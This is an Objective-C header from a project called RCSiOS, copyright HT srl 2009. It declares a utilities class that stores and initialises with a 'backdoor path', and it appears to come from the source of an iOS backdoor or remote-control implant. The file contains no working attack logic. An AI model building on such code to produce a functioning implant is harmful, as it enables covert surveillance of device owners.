/*
 * RCSiOS - Utils
 *
 *
 * Created on 08/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Foundation/Foundation.h>

#ifndef __RCSIUtils_h__
#define __RCSIUtils_h__


@interface RCSIUtils : NSObject
{
@private
  NSString *mBackdoorPath;
}

- (id)initWithBackdoorPath: (NSString *)aBackdoorPath;

- (void)dealloc;

@end

#endif
